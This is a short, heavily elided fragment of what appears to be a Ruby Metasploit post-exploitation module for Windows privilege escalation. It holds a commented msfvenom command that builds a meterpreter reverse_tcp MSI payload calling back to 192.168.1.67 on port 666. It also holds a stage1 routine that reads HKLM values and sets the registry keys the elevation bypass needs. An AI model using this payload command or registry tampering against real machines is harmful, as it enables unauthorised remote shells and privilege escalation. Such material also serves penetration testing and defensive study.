...
#
# [ BUILD MSI PAYLOAD ]
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 --platform windows -f msi -o priv_escal.msi
#
...
def ls_stage1
  ...
  local_machine_value = registry_getvaldata(hklm,install)
    ...
    if local_machine_value.nil? || local_machine_value == 0
      ...
      print_status("Setting '#{install}' remote requiered registry keys...")
      ...
      print_good(" REMARK: Bypass its allready active. (no further need to change reg key data again)!")
